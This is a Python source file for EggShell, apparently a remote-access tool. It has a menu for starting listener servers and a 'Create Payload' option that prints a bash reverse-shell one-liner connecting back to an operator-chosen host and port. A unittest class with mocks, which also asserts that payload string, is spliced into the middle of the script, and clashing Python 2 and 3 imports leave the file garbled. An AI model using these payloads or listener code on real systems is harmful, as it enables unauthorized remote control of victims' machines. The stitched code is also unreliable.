#!/usr/bin/python
#EggShell
#Created By lucas.py 8-18-16
#TODO: Gain root, and fix for any system() call locally
debug = 0

import base64
import binascii
import os
import random
import string
import sys
import time
try:
    from io import StringIO  # Python 3 and Python 2 (since Python 2.6)
except ImportError:
    raise ImportError("StringIO module is required but not found in your Python environment.")
import sys
import unittest
import mock # For Python 2, ensure 'mock' library is installed (pip install mock)
from StringIO import StringIO # Python 2's StringIO

# Assuming 'eggshell.py' is in the same directory or accessible via PYTHONPATH
import eggshell

class TestEggShell(unittest.TestCase):

    def setUp(self):
        """
        Set up mock objects for dependencies before each test.
        This patches the global 'h' (Helper instance) and 'server' (ESServer instance)
        within the 'eggshell' module for the duration of each test.
        """
        # Mock the Helper instance (eggshell.h)
        self.mock_h = mock.Mock(spec=eggshell.Helper)
        self.mock_h.CMD_CLEAR = "mock_clear_command"
        self.mock_h.GREEN = ""  # Empty strings to simplify output assertions
        self.mock_h.RED = ""
        self.mock_h.COLOR_INFO = ""
        self.mock_h.WHITE = ""
        self.mock_h.ENDC = ""
        self.mock_h.NES = "[eggshell_mock]> " # Mocked prompt prefix
        # Ensure strinfo is a mock method if it's called
        self.mock_h.strinfo = mock.Mock()

        # Mock the ESServer instance (eggshell.server)
        self.mock_server = mock.Mock(spec=eggshell.ESServer)
        self.mock_server.getip = mock.Mock() # Ensure getip is a mock method
        self.mock_server.singleServer = mock.Mock()
        self.mock_server.multiServer = mock.Mock()

        # Apply patches to the 'eggshell' module's global instances
        self.patcher_h = mock.patch('eggshell.h', self.mock_h)
        self.patcher_server = mock.patch('eggshell.server', self.mock_server)

        self.patcher_h.start()
        self.patcher_server.start()

        # Mock os.system to prevent actual system calls
        self.patcher_os_system = mock.patch('os.system')
        self.mock_os_system = self.patcher_os_system.start()

        # Mock sys.exit to prevent tests from terminating prematurely
        self.patcher_sys_exit = mock.patch('sys.exit')
        self.mock_sys_exit = self.patcher_sys_exit.start()

    def tearDown(self):
        """
        Stop all patchers after each test.
        """
        self.patcher_h.stop()
        self.patcher_server.stop()
        self.patcher_os_system.stop()
        self.patcher_sys_exit.stop()

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_defaults(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", ""] # User presses Enter for LHOST, then LPORT

        expected_lhost = "192.168.1.100"
        expected_lport = 4444

        result = eggshell.promptHostPort()

        self.assertEqual(result, [expected_lhost, expected_lport])
        self.mock_h.strinfo.assert_any_call("LHOST = " + expected_lhost)
        self.mock_h.strinfo.assert_any_call("LPORT = " + str(expected_lport))
        mock_raw_input.assert_any_call("SET LHOST (Leave blank for 192.168.1.100)>")
        mock_raw_input.assert_any_call("SET LPORT (Leave blank for 4444)>")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_custom_host_default_port(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["10.0.0.1", ""]

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["10.0.0.1", 4444])
        self.mock_h.strinfo.assert_any_call("LHOST = 10.0.0.1")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_default_host_custom_port(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "8080"]

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 8080])
        self.mock_h.strinfo.assert_any_call("LPORT = 8080")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_invalid_port_non_int_then_valid(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "abc", "5555"] # LHOST, invalid LPORT, valid LPORT

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 5555])
        self.mock_h.strinfo.assert_any_call("invalid port, please enter a valid integer")
        self.mock_h.strinfo.assert_any_call("LPORT = 5555")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_invalid_port_too_low_then_valid(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", "80", "5555"] # LHOST, LPORT < 1024, valid LPORT

        result = eggshell.promptHostPort()

        self.assertEqual(result, ["192.168.1.100", 5555])
        self.mock_h.strinfo.assert_any_call("invalid port, please enter a value >= 1024")

    @mock.patch('eggshell.raw_input')
    def test_promptHostPort_keyboard_interrupt_on_lport(self, mock_raw_input):
        self.mock_server.getip.return_value = "192.168.1.100"
        mock_raw_input.side_effect = ["", KeyboardInterrupt] # LHOST, then Ctrl+C for LPORT

        result = eggshell.promptHostPort()
        self.assertIsNone(result)

    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_decline_start(self, mock_raw_input):
        mock_raw_input.return_value = "n" # Input for "Start Server? (Y/n): "
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.singleServer.assert_not_called()
        self.mock_server.multiServer.assert_not_called()
        mock_raw_input.assert_called_once_with(self.mock_h.NES + "Start Server? (Y/n): ")

    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_start_single_server(self, mock_raw_input):
        mock_raw_input.side_effect = ["Y", "N"] # Yes to start, No to multi
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.singleServer.assert_called_once_with(host, port)
        self.mock_server.multiServer.assert_not_called()
        self.assertEqual(mock_raw_input.call_count, 2)

    @mock.patch('eggshell.raw_input')
    def test_promptServerRun_start_multi_server(self, mock_raw_input):
        mock_raw_input.side_effect = ["Y", "y"] # Yes to start, Yes to multi
        host, port = "127.0.0.1", 1234

        eggshell.promptServerRun(host, port)

        self.mock_server.multiServer.assert_called_once_with(host, port)
        self.mock_server.singleServer.assert_not_called()
        self.assertEqual(mock_raw_input.call_count, 2)

    def test_menuExit(self):
        # The sys.exit mock is configured in setUp
        eggshell.menuExit()
        self.mock_sys_exit.assert_called_once_with() # Python 2 exit() is equivalent to sys.exit()

    @mock.patch('eggshell.promptHostPort')
    def test_menuStartServer_with_valid_host_port(self, mock_promptHostPort):
        mock_promptHostPort.return_value = ["127.0.0.1", 1234]

        eggshell.menuStartServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.singleServer.assert_called_once_with("127.0.0.1", 1234)

    @mock.patch('eggshell.promptHostPort')
    def test_menuStartServer_with_no_host_port(self, mock_promptHostPort):
        mock_promptHostPort.return_value = None # User cancelled prompt

        eggshell.menuStartServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.singleServer.assert_not_called()

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.menu') # Mock the recursive call to menu()
    def test_menuStartMultiServer_with_valid_host_port(self, mock_menu, mock_promptHostPort):
        mock_promptHostPort.return_value = ["127.0.0.1", 5678]

        eggshell.menuStartMultiServer()

        mock_promptHostPort.assert_called_once()
        self.mock_server.multiServer.assert_called_once_with("127.0.0.1", 5678)
        mock_menu.assert_called_once() # Check that menu() is called again

    @mock.patch('eggshell.promptHostPort')
    @mock.patch('eggshell.promptServerRun')
    @mock.patch('sys.stdout', new_callable=StringIO) # Capture print output
    def test_menuCreateScript_generates_payload_and_prompts_run(self, mock_stdout, mock_promptServerRun, mock_promptHostPort):
        test_host = "10.0.0.2"
        test_port = 9999
        mock_promptHostPort.return_value = [test_host, test_port]

        # Configure mocked color codes for predictable output string
        # These are set on self.mock_h which is patching eggshell.h
        self.mock_h.COLOR_INFO = "[INFO_PREFIX]"
        self.mock_h.ENDC = "[INFO_SUFFIX]"

        eggshell.menuCreateScript()

        mock_promptHostPort.assert_called_once()

        # Verify printed output
        expected_payload_output = "[INFO_PREFIX]bash &> /dev/tcp/{}/{} 0>&1[INFO_SUFFIX]\n".format(test_host, test_port)
        self.assertEqual(mock_stdout.getvalue(), expected_payload_output)

        # Verify promptServerRun is called
        mock_promptServerRun.assert_called_once_with(test_host, test_port)

if __name__ == '__main__':
    unittest.main()
from threading import Thread
sys.dont_write_bytecode = True
from modules.encryption.ESEncryptor import ESEncryptor
from modules.server.server import ESServer
from modules.helper.helper import Helper
#MARK: Globals
h = Helper()
shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(32))
server = ESServer(ESEncryptor(shellKey,16),h)

BANNER_ART_TEXT = h.GREEN+"""
.---.          .-. .        . .       \\      `.
|             (   )|        | |     o  \\       `.
|--- .-.. .-.. `-. |--. .-. | |         \\        `.
|   (   |(   |(   )|  |(.-' | |     o    \\      .`
'---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
     ._.' ._.'                               `          """+h.RED+"""
 _._._._._._._._._._|"""+h.COLOR_INFO+"______________________________________________."+h.RED+"""
|_#_#_#_#_#_#_#_#_#_|"""+h.COLOR_INFO+"_____________________________________________/"+h.RED+"""
                    l
"""+h.WHITE+"\nVersion: 2.2.2\nCreated By Lucas Jackson (@neoneggplant)\n"+h.ENDC
BANNER_MENU_TEXT = h.WHITE+"-"*40+"\n"+""" Menu:
    1): Start Server
    2): Start Multi Server
    3): Create Payload
    4): Exit
"""+h.WHITE+"-"*40
BANNER = BANNER_ART_TEXT+""+BANNER_MENU_TEXT+"\n"+h.NES
ONMENU = 1

def raw_input(*args, **kwargs):
    raise NotImplementedError

def menu():
    global ONMENU
    while 1:
        ONMENU = 1
        os.system(h.CMD_CLEAR)
        option = raw_input(BANNER)
        choose = {
            "1" : menuStartServer,
            "2" : menuStartMultiServer,
            "3" : menuCreateScript,
            "4" : menuExit
        }
        try:
            ONMENU = 0
            choose[option]()
            os.system(h.CMD_CLEAR)
        except KeyError:
            ONMENU = 1
            continue

def promptHostPort():
    lhost = server.getip()
    lport = None
    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
    if hostChoice != "":
        lhost = hostChoice
    h.strinfo("LHOST = " + lhost)
    #validate int
    while 1:
        try:
            lport = raw_input("SET LPORT (Leave blank for 4444)>")
            if not lport:
                lport = 4444
            lport = int(lport)
            if lport < 1024:
                h.strinfo("invalid port, please enter a value >= 1024")
                continue
            break
        except KeyboardInterrupt:
            return
        except:
            h.strinfo("invalid port, please enter a valid integer")

    h.strinfo("LPORT = " + str(lport))
    return [lhost,lport]

def promptServerRun(host,port):
    if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
        return
    else:
        if raw_input(h.NES+"Multi Server? (y/N): ") == "y":
            server.multiServer(host,port)
        else:
            server.singleServer(host,port)

#MARK: Menu Functions

def menuStartServer(): #1
    sp = promptHostPort()
    if not sp:
        return
    server.singleServer(sp[0],sp[1])

def menuStartMultiServer(): #2
    sp = promptHostPort()
    server.multiServer(sp[0],sp[1]);
    menu()

def menuCreateScript(): #3
    sp = promptHostPort()
    print(h.COLOR_INFO + "bash &> /dev/tcp/" + sp[0] + "/" + str(sp[1]) + " 0>&1" + h.ENDC)
    promptServerRun(sp[0],sp[1])

def menuExit(): #4
    exit()

def main():
    """
    Main loop of the program. Continuously displays the menu until interrupted.
    Handles KeyboardInterrupt (Ctrl+C): if the global variable ONMENU is set to 1,
    prints an empty line and exits the program.
    """
    global ONMENU
    while 1:
        try:
            menu()
        except KeyboardInterrupt:
            if ONMENU == 1:
                print("")
                exit()

main()
